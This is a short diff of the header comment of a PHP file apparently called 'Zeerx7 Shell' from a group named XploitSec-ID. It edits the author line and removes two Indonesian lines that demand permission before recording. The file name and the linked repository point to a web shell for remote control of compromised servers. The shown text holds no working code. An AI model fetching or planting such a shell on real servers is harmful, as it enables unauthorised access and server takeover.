@@ -1,13 +1,10 @@
 <?php
 /*
     ^ Name : Zeerx7 Shell
-    ^ Author: Zeerx7(Pausi)
+    ^ Author: Zeerx7
     ^ Team: XploitSec-ID
     ^ Version : V.1
     ^ https://github.com/404rgr/zeerx7
-
-    * Ingin Record? izin dulu gan
-    * gak izin? Sfx lo nob bab!
 
     ! Note:
     'tidak semua tools disini saya yang buat!!'
